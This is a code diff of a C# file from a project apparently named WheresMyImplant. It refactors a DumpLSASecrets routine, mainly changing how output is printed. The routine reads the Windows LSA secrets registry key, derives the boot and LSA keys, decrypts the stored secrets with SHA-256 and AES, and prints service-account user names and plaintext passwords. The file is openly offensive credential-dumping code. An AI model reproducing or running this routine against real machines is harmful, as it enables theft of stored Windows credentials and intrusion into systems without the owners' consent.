@@ -1,11 +1,10 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Linq;
-using System.Security.Principal;
 using System.Security.Cryptography;
-using System.Runtime.InteropServices;
 using System.Text;
 using Microsoft.Win32;
+
+using MonkeyWorks;
 
 namespace WheresMyImplant
 {
@@ -22,18 +21,18 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal void DumpLSASecrets()
         {
-            WriteOutputNeutral("Reading Secrets Key: SECURITY\\Policy\\Secrets");
+            Console.WriteLine("[*] Reading Secrets Key: SECURITY\\Policy\\Secrets");
             String[] secretSubKeys = Registry.LocalMachine.OpenSubKey(@"SECURITY\Policy\Secrets").GetSubKeyNames();
             if (secretSubKeys.Length <= 0)
             {
-                WriteOutputBad("[-] Reading Secrets key failed");
+                Console.WriteLine("[-] [-] Reading Secrets key failed");
                 return;
             }
 
             Byte[] bootKey = GetBootKey();
-            WriteOutputGood("BootKey : " + BitConverter.ToString(bootKey).Replace("-",""));
+            Console.WriteLine("[+] BootKey : " + BitConverter.ToString(bootKey).Replace("-",""));
             Byte[] lsaKey = GetLsaKey(bootKey);
-            WriteOutputGood("LSA Key : " + BitConverter.ToString(lsaKey).Replace("-", ""));
+            Console.WriteLine("[+] LSA Key : " + BitConverter.ToString(lsaKey).Replace("-", ""));
 
             foreach (String secret in secretSubKeys)
             {
@@ -60,7 +59,7 @@ namespace WheresMyImplant
                     password = ParseDecrypted(decryptedSecret);
                 }
                 String result = String.Format("{0,-30} {1,-20} {2,-20}\n", serviceName, userName, password);
-                WriteOutputGood(result);
+                Console.WriteLine(result);
             }
         }
 
@@ -114,7 +113,7 @@ namespace WheresMyImplant
             {
                 for (Int32 i = 0; i < 1000; i++)
                 {
-                    combinedKey = Misc.Combine(combinedKey, splicedSecret);
+                    combinedKey = Combine.combine(combinedKey, splicedSecret);
                 }
                 hash = sha256.ComputeHash(combinedKey);
             }
@@ -129,7 +128,7 @@ namespace WheresMyImplant
                     aes.IV = new Byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
                     aes.Padding = PaddingMode.Zeros;
                     ICryptoTransform decryptor = aes.CreateDecryptor();
-                    plaintextSecret = Misc.Combine(plaintextSecret, decryptor.TransformFinalBlock(secret, i, 16));
+                    plaintextSecret = Combine.combine(plaintextSecret, decryptor.TransformFinalBlock(secret, i, 16));
                 }
             }
             return plaintextSecret;
